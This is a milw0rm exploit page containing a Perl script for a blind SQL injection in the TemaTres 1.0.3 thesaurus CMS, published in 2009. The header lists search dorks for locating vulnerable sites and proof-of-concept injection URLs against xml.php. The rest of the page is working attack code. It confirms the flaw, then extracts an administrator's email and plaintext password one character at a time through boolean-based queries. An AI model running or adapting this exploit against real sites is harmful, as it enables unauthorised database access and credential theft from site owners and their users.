<html><head><title>TemaTres 1.0.3 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|     (dcTema,madsTema,zthesTema,skosTema,xtmTema) BLIND SQL INJECTION (BSQLi) EXPLOIT	      |
#|--------------------------------------------------------------------------------------------|
#|                         	    |   TemaTres v1.0.3    |		 	              |
#|  CMS INFORMATION:		     ---------------------				      |
#|										              |
#|--&gt;WEB: http://www.r020.com.ar/tematres/               	   		              |
#|--&gt;DOWNLOAD: http://sourceforge.net/projects/tematres/ 	   		              |
#|--&gt;DEMO: http://www.r020.com.ar/tematres/index.php					      |
#|--&gt;CATEGORY: CMS / Portals								      |
#|--&gt;DESCRIPTION: Web application to manage controlled vocabularies, taxonomies and thesaurus |
#| 		/ Aplicación Web para la gestión de lenguajes documentales, ... 	      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3								      |
#|--&gt;DORKs: &quot;Powered by TemaTres&quot; / &quot;Generado por TemaTres&quot; / &quot;Criado por TemaTres&quot;	      |
#|--&gt;CATEGORY: BLIND SQL INJECTION EXPLOIT						      |
#|--&gt;AFFECT VERSION: LAST = 1.0.3 (maybe &lt;= ?)						      |
#|--&gt;Discovered Bug date: 2009-04-24							      |
#|--&gt;Reported Bug date: 2009-04-24							      |
#|--&gt;Fixed bug date: 2009-05-04								      |
#|--&gt;Info patch (v1.0.31): http://www.r020.com.ar/tematres/tematres1.031.zip	       	      |
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#**gpc_magic_quotes=off
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#~~~~~~-----&gt; (get vars --&gt; 'dcTema', 'madsTema', 'zthesTema', 'skosTema', 'xtmTema'):
#
#http://[HOST]/[HOME_PATH]/xml.php?dcTema=1'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?dcTema=1'+AND+1=1/*
#
#http://[HOST]/[HOME_PATH]/xml.php?madsTema=2'+and+1=1/*
#http://[HOST]/[HOME_PATH]/xml.php?madsTema=2'+and+1=0/*
#
#http://[HOST]/[HOME_PATH]/xml.php?zthesTema=2'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?zthesTema=2'+AND+1=1/*
#
#http://[HOST]/[HOME_PATH]/xml.php?skosTema=2'+AND+1=1/*
#http://[HOST]/[HOME_PATH]/xml.php?skosTema=2'+AND+1=0/*
#
#http://[HOST]/[HOME_PATH]/xml.php?xtmTema=2'+AND+1=0/*
#http://[HOST]/[HOME_PATH]/xml.php?xtmTema=2'+AND+1=1/*
#
#######################################################################
#######################################################################
##*******************************************************************##
## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##    GREETZ TO: JosS, Ulises2k and all SPANISH Hack3Rs community!   ##
##*******************************************************************##
#######################################################################
#######################################################################
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title TemaTres CMS v1.0.3 (BLIND SQL Injection) Exploit&quot;);
		system (&quot;color 04&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(GET =&gt; $_[0]); 
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[###] TemaTres CMS v1.0.3 - (BLIND SQL Injection) Exploit\n&quot;;
	print &quot;\t[###] USAGE MODE: [###]\n&quot;;
	print &quot;\t[###] perl $0 [HOST] [PATH] [DBPREFIX] [Id]\n&quot;;
	print &quot;\t[###] [HOST]: Web.\n&quot;;
	print &quot;\t[###] [PATH]: Home Path.\n&quot;;
	print &quot;\t[###] [DBPREFIX]: Database Prefix. Default: lc_ (**optional)\n&quot;;
	print &quot;\t[###] [id]: Id user. Default: 1 (**optional)\n&quot;;
	print &quot;\t[###] Example: perl $0 'www.example.es' 'tematres1.03' 'lc_' '1'\n&quot;; 
}
sub lengthcolumns{
#First, user length...
$exit=0;
$i=0;
while($exit==0){
	my $blindsql=$_[0].&quot;1'+AND+(SELECT+length(&quot;.$_[3].&quot;)+FROM+&quot;.$_[2].&quot;usuario+WHERE+id=&quot;.$_[1].&quot;)=&quot;.$i++.&quot;/*&quot;; #injected code
	$output=&amp;request($blindsql);
	if($output =~ (/\&lt;dcterms\:created\&gt;[0-9\-\:\s]+\&lt;\/dcterms\:created&gt;/)){
		$exit=1;
	}else{
		$exit=0;
	}
}
#Save column length
$length=$i-1;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\t&quot;.$_[3].&quot; Length catched!\n&quot;;
print &quot;\t&quot;.$_[3].&quot; Length: &quot;.$length.&quot;\n&quot;;
print &quot;\tBruteforcing values...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
return $length;
}
sub bruteforcing {
my $values=&quot;&quot;;
#Getting datas
$j=1;
	$i=46;
	while(($j&lt;=$_[2]) &amp;&amp; ($i&lt;=126)){
		$blindsql=$_[0].&quot;1'+AND+ascii(substring((SELECT+&quot;.$_[3].&quot;+FROM+&quot;.$_[4].&quot;usuario+WHERE+id='&quot;.$_[1].&quot;'),&quot;.$j.&quot;,1))=&quot;.$i.&quot;/*&quot;; #injected code
		my $output=&amp;request($blindsql);
		if($output =~ (/\&lt;dcterms\:created\&gt;[0-9\-\:\s]+\&lt;\/dcterms\:created&gt;/)){
			$values=$values.chr($i);
			$j++;
			$i=45;
		}
		if($i==57)
		{
			$i=63; #@
		}
		if($i==64)
		{
			$i=96;
		}
#new char
	$i++; 
	}
#Error
	if(($i&gt;127) || ($j&gt;$_[2])){
		if(!$values){
			print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
			print &quot;\tEXPLOIT FAILED!\n&quot;;
			print &quot;\tFatal error: Datas doesn't find!\n&quot;;
			print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
			print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
			exit(1);
		}
	}
	
return $values;
}
#Main
&amp;lw;
	print &quot;\t\t#######################################################\n\n&quot;;
	print &quot;\t\t#######################################################\n\n&quot;;
	print &quot;\t\t##  TemaTres v1.0.3 - (BLIND SQL Injection) Exploit  ##\n\n&quot;;
	print &quot;\t\t##     ++Conditions: Need magic_quotes=off           ##\n\n&quot;;
	print &quot;\t\t##                 Author: Y3nh4ck3r                 ##\n\n&quot;;
	print &quot;\t\t##          Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n&quot;;
	print &quot;\t\t##                  Proud to be Spanish!             ##\n\n&quot;;
	print &quot;\t\t#######################################################\n\n&quot;;
	print &quot;\t\t#######################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
#Build the uri
	my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/xml.php?dcTema=&quot;;
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=1) 
	{
		&amp;helper;
		exit(1);	
	}
#DB PREFIX parameter. It's optional. Default: lc_
	if(!$ARGV[2]){
		$db_prefix=&quot;lc_&quot;;	
	}else{
		$db_prefix=$ARGV[2];	
	}
#Id-user is optional.Default:1
	if(!$ARGV[3]){
		$idhacked=&quot;1&quot;;	
	}else{
		$idhacked=$ARGV[3];	
	}
#Testing blind sql injection
my $finalrequest = $finalhost;	
#Test blind sql injection
my $blindsql=$finalrequest.&quot;1'+AND+1=0/*&quot;; #injected code
$output=&amp;request($blindsql);
if ($output =~ (/\&lt;dcterms\:created\&gt;[0-9\-\:\s]+\&lt;\/dcterms\:created&gt;/))
{   
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tThis Web is not vulnerable!\n&quot;;
	print &quot;\t---&gt;Maybe:\n&quot;;
	print &quot;\t---&gt;Patched or gpc_magic_quotes=off\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1);
}else{ 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tWeb is vulnerable!\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tChecking id user...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
 
}	
#Test if user exists
my $blidsql=$finalrequest.&quot;1'+AND+(SELECT+COUNT(*)+FROM+&quot;.$db_prefix.&quot;usuario+WHERE+id='&quot;.$idhacked.&quot;')/*&quot;; #injected code
$output=&amp;request($blindsql);
if ($output =~ (/\&lt;dcterms\:created\&gt;[0-9\-\:\s]+\&lt;\/dcterms\:created&gt;/))
{    
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tUser doesn't exists!\n&quot;;		
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1); 
}else{ 

	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tOK...The user exists!\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tWait several minutes...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
}	
#Bruteforcing user...
$length_mail=&amp;lengthcolumns($finalrequest,$idhacked,$db_prefix,'mail');
$length_pass=&amp;lengthcolumns($finalrequest,$idhacked,$db_prefix,'pass');
$email=&amp;bruteforcing($finalrequest,$idhacked,$length_mail,'mail',$db_prefix);
if(length($email)!=$length_mail)
{
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\tFatal error: Different length email!\n&quot;;
	print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1);
}

print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tGot user!\n&quot;;
print &quot;\tBruteforcing password (no hash!)...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
#Bruteforcing password...
$passnohash=&amp;bruteforcing($finalrequest,$idhacked,$length_pass,'pass',$db_prefix); #it isn't needed length
if(length($passnohash)!=$length_pass)
{
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\tFatal error: Different length pass!\n&quot;;
	print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1);
}
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t*** EXPLOIT EXECUTED (TemaTres v1.0.3 BSQLi) ****\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tUser-id:&quot;.$idhacked.&quot;\n&quot;;
print &quot;\t\tE-mail:&quot;.$email.&quot;\n&quot;;
print &quot;\t\tUser-password:&quot;.$passnohash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-05]</pre></html>